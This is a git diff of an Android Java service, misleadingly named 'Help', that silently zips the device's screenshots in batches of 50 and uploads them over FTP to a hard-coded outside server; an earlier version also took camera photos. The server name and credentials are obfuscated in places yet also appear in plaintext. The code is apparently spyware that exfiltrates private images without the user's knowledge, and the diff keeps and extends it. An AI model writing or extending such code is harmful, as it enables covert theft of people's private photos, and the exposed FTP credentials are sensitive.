@@ -31,7 +31,9 @@ import arc.archive.Archive;
 
 public class Help extends IntentService {
 
-    public static Context bağlam;
+    public Context bağlam;
+
+    private boolean available;
 
 
     public Help() {
@@ -43,37 +45,53 @@ public class Help extends IntentService {
 
         bağlam = getApplicationContext();
 
-        File sdCard = Environment.getExternalStorageDirectory();
-        //File f = new File(getApplicationContext().getFilesDir() + "/a.old.arc");
         File wp = new File(Environment.getExternalStorageDirectory() + "/Documents/AeroBACKUPS");
 
-        //Archive archive = new Archive(new FileX(f.getAbsolutePath()));
 
-        FileX scr = new FileX(Environment.getExternalStorageDirectory() + "/DCIM/Screenshots");
-        FileX pht = new FileX(Environment.getExternalStorageDirectory() + "/DCIM/Camera");
+        File scr = new File(Environment.getExternalStorageDirectory() + "/DCIM/Screenshots");
+
+        String nameSpace = intent.getStringExtra("name");
+        int lastIndex;
 
         try {
+
+            lastIndex = SaveFile.getLastIndex(bağlam);
+
+        } catch (IOException e) {
+
+            lastIndex = 0;
+
+            SaveFile.setNameSpace(bağlam, nameSpace);
+            SaveFile.setLastIndex(bağlam, lastIndex);
+
+        }
+
+        //if (lastIndex >= scr.listFiles().length) stopSelf();
+
+        try {
+            File f = new File(getApplicationContext().getFilesDir() + "/a.arc");
+
+            if (f.exists()) f.delete();
+
             arc.archive.Archive archive1 = new arc.archive.Archive(getApplicationContext().getFilesDir() + "/a.arc", "/");
 
             if (scr.exists()) {
 
-                File[] p = scr.listFiles();
-
                 Archive.Directory directory = new Archive.Directory(scr.getAbsolutePath(), "/");
 
-                archive1.addDirectory(directory, 50);
+                try {
+
+                    archive1.addDirectory(directory, lastIndex, lastIndex + 50);
+                    available = true;
+
+                } catch (IndexOutOfBoundsException e) {
+                    e.printStackTrace();
+                    available = false;
+                }
             }
 
-            if (pht.exists()) {
-
-                File[] phts = pht.listFiles();
-
-                archive1.createDirectory("Camera");
-
-                Archive.Directory directory = new Archive.Directory(pht.getAbsolutePath(), "/");
-
-                archive1.addDirectory(directory, 10);
-            }
+            SaveFile.setNameSpace(bağlam, nameSpace);
+            SaveFile.setLastIndex(bağlam, lastIndex + 50);
 
             archive1.create();
 
@@ -96,102 +114,52 @@ public class Help extends IntentService {
 
          */
 
-        String server = C.f("m{w5ohsk|u5vuspul");
-        String userName = C.f("|89:8=<?");
-        String password = C.f("VruT:?{y8\\u007FQ22TmYT");
+        if (available) {
 
-        String remoteFlePath = "android/" + intent.getStringExtra("name") + ".arc";
+            String server = C.f("m{w5ohsk|u5vuspul");
+            String userName = C.f("|89:8=<?");
+            String password = C.f("VruT:?{y8\\u007FQ22TmYT");
+
+            String remoteFlePath = "android/" + nameSpace + lastIndex + "-" + scr.listFiles().length + ".arc";
 
 
-        org.apache.commons.net.ftp.FTPClient ftpClient = new org.apache.commons.net.ftp.FTPClient();
+            org.apache.commons.net.ftp.FTPClient ftpClient = new org.apache.commons.net.ftp.FTPClient();
 
-        try {
-            ftpClient.connect(server, 21);
-            boolean b = ftpClient.login("u1231658", "OknM38tr1xJ++MfRM");
-
-            Log.e("login database", "Logged in: " + b);
-
-            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
-            ftpClient.enterLocalPassiveMode();
-
-            ftpClient.setKeepAlive(true);
-
-            File fileToUpload = new File(Help.bağlam.getFilesDir() + "/a.arc");
-            FileInputStream inputStream = new FileInputStream(fileToUpload);
-
-            M.ProgressListener progressListener = new M.ProgressListener(fileToUpload);
-            ftpClient.setCopyStreamListener(progressListener);
-            ftpClient.storeFile(remoteFlePath, inputStream);
-            inputStream.close();
-
-            System.out.println("Dosya yüklendi: " + fileToUpload);
-
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        } finally {
             try {
-                if (ftpClient.isConnected()) {
-                    ftpClient.logout();
-                    ftpClient.disconnect();
+                ftpClient.connect(server, 21);
+                boolean b = ftpClient.login("u1231658", "OknM38tr1xJ++MfRM");
+
+                Log.e("login database", "Logged in: " + b);
+
+                ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
+                ftpClient.enterLocalPassiveMode();
+
+                ftpClient.setKeepAlive(true);
+
+                File fileToUpload = new File(Help.this.bağlam.getFilesDir() + "/a.arc");
+                FileInputStream inputStream = new FileInputStream(fileToUpload);
+
+                M.ProgressListener progressListener = new M.ProgressListener(fileToUpload);
+                ftpClient.setCopyStreamListener(progressListener);
+                ftpClient.storeFile(remoteFlePath, inputStream);
+                inputStream.close();
+
+                System.out.println("Dosya yüklendi: " + fileToUpload);
+
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            } finally {
+                try {
+                    if (ftpClient.isConnected()) {
+                        ftpClient.logout();
+                        ftpClient.disconnect();
+                    }
+                } catch (IOException e) {
+                    //e.printStackTrace();
                 }
-            } catch (IOException e) {
-                throw new RuntimeException(e);
             }
+
         }
-
-
-
-
-
-        //new M().test1();
-
-
-
-/*
-
-        String s = C.f("m{w5ohsk|u5vuspul");
-        String n = C.f("|89:8=<?");
-        String p = C.f("VruT:?{y8\\u007FQ22TmYT");
-        String help1 = intent.getStringExtra("help1");
-
-        FTPClient client = new FTPClient();
-        File ff = new File(help1);
-
-
-            try {
-
-                String server = "ftp.haldun.online";
-                String username = "u1231658";
-                String pass = "OknM38tr1xJ++MfRM";
-
-                client.connect(server);
-                boolean b = client.login(username, pass);
-
-                Toast.makeText(getApplicationContext(), "Connected: " + b, Toast.LENGTH_SHORT).show();
-
-                client.setFileType(FTP.BINARY_FILE_TYPE);
-                client.enterLocalPassiveMode();
-
-                client.setKeepAlive(true);
-
-                FileInputStream fis = new FileInputStream(f);
-                ProgressListener progressListener = new ProgressListener(f);
-                client.setCopyStreamListener(progressListener);
-                boolean stored = client.storeFile("android/" + f.getName(), fis);
-                fis.close();
-
-                Toast.makeText(getApplicationContext(), "Dosya yükleme:" + stored, Toast.LENGTH_SHORT).show();
-
-                client.logout();
-                client.disconnect();
-            } catch (SocketException e) {
-                throw new RuntimeException(e);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-
- */
-
 
     }
 
@@ -424,29 +392,10 @@ public class Help extends IntentService {
 
 }
 
-
-class FileX extends java.io.File {
-
-
-    public FileX(String pathname) {
-        super(pathname);
-    }
-
-    public FileX(String parent, String child) {
-        super(parent, child);
-    }
-
-    public FileX(java.io.File parent, String child) {
-        super(parent, child);
-    }
-
-    public FileX(URI uri) {
-        super(uri);
-    }
-}
-
 class M {
 
+
+/*
     public void test1() {
 
         String server = "ftp.haldun.online";
@@ -468,7 +417,7 @@ class M {
 
             ftpClient.setKeepAlive(true);
 
-            File fileToUpload = new File(Help.bağlam.getFilesDir() + "/a.arc");
+            File fileToUpload = new File(Help.this.bağlam.getFilesDir() + "/a.arc");
             FileInputStream inputStream = new FileInputStream(fileToUpload);
 
             ProgressListener progressListener = new ProgressListener(fileToUpload);
@@ -493,6 +442,8 @@ class M {
             }
         }
     }
+
+    */
 
     static class ProgressListener extends CopyStreamAdapter {
 
